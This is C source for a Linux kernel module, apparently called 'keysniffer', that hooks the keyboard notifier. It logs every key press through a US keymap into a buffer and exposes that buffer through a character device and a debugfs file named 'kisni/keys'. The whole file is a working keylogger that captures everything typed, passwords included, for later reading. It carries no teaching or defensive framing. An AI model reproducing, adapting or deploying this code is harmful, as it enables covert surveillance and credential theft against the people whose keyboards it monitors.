#undef __KERNEL__
#define __KERNEL__ /* We're part of the kernel */
#undef MODULE
#define MODULE     /* Not a permanent part, though. */

#include <linux/ioctl.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/string.h>   /* for memset. NOTE - not string.h!*/
#include <linux/keyboard.h>
#include <linux/debugfs.h>

#define DEV_NAME "sniffdev"
#define MAJOR_NUM 255
#define SUCCESS 0
#define BUFFSIZE 2048

MODULE_LICENSE("GPL");

static size_t buf_pos;
static char keys_buf[BUFFSIZE] = {0};

int __init init_module(void);
void __exit cleanup_module(void);
static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t * offset);
static int device_open(struct inode *inode, struct file *file);
int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);
//static int device_release(struct inode *inode, struct file *file);
//static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t * off);

static void bprintk(char __user * buffer, char * str, int size);



static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"}, {"_TAB_", "_TAB_"},
	{"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},
	{"'", "\""}, {"`", "~"}, {"_SHIFT_", "_SHIFT_"}, {"\\", "|"},
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},
	{".", ">"}, {"/", "?"}, {"_SHIFT_", "_SHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_ALT_", "_ALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"}, {"_KPD7_", "_HOME_"},
	{"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, {"-", "-"}, {"_KPD4_", "_LEFT_"},
	{"_KPD5_", "_KPD5_"}, {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, {"_KPD._", "_DEL_"},
	{"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"}, {"\0", "\0"}, {"F11", "F11"},
	{"F12", "F12"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"_ENTER_", "_ENTER_"}, {"_CTRL_", "_CTRL_"}, {"/", "/"}, {"_PRTSCR_", "_PRTSCR_"},
	{"_ALT_", "_ALT_"}, {"\0", "\0"}, {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"},
	{"_PGUP_", "_PGUP_"}, {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"}, {"_DEL_", "_DEL_"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"_PAUSE_", "_PAUSE_"},
};

static struct dentry *file;
static struct dentry *subdir;

static struct file_operations fops = {
	.read = device_read,
	.open = device_open
};

static struct notifier_block keysniffer_blk = {
	.notifier_call = keysniffer_cb,
};

int __init init_module(void){
	unsigned int rc = 0;
	rc = register_chrdev(MAJOR_NUM, DEV_NAME, &fops); /* our own file operations struct */
    /* 
     * Negative values signify an error 
     */
    if (rc < 0) {
        printk(KERN_ALERT "%s failed with %d\n",
               "Sorry, registering the character device ", MAJOR_NUM);
        return -1;
    }


    subdir = debugfs_create_dir("kisni", NULL);
	if (IS_ERR(subdir))
		return PTR_ERR(subdir);
	if (!subdir)
		return -ENOENT;

	file = debugfs_create_file("keys", S_IRUSR, subdir, NULL, &fops);
	if (!file) {
		debugfs_remove_recursive(subdir);
		return -ENOENT;
	}


    buf_pos = 0;

    register_keyboard_notifier(&keysniffer_blk);

	printk("Module is in\n");
	return 0;
}

void __exit cleanup_module(void){
	unregister_keyboard_notifier(&keysniffer_blk);
	unregister_chrdev(MAJOR_NUM, DEV_NAME);
	printk("Module is out\n");
}


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param){
	size_t len;
	struct keyboard_notifier_param *param = _param;
	const char *pressed_key;

	/* pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
		code, param->down, param->shift, param->value); */

	if (!(param->down))
		return NOTIFY_OK;

	if (param->value >= 0x1 && param->value <= 0x77) {
		pressed_key = param->shift
				? us_keymap[param->value][1]
				: us_keymap[param->value][0];
		if (pressed_key) {
			len = strlen(pressed_key);

			if ((buf_pos + len) >= BUFFSIZE) {
				memset(keys_buf, 0, BUFFSIZE);
				buf_pos = 0;
			}

			strncpy(keys_buf + buf_pos, pressed_key, len);
			buf_pos += len;
			//keys_buf[buf_pos++] = '\n';

			pr_debug("%s\n", pressed_key); 
			//printk("Sniffer: %s\n", pressed_key);
		}
	}

	return NOTIFY_OK;
}

static int device_open(struct inode *inode, struct file *file)
{
    printk("You tried to open the device-file\n");

    return SUCCESS;
}


static ssize_t device_read(struct file *file, 
               char __user * buffer, 
               size_t length, 
               loff_t * offset)
{
	return simple_read_from_buffer(buffer, length, offset, keys_buf, buf_pos);
}

static void bprintk(char __user * buffer, char * str, int size){
	int i;
    for(i=0;i<BUFFSIZE;i++){
    	put_user(*(str+i), buffer+i);
	}
}
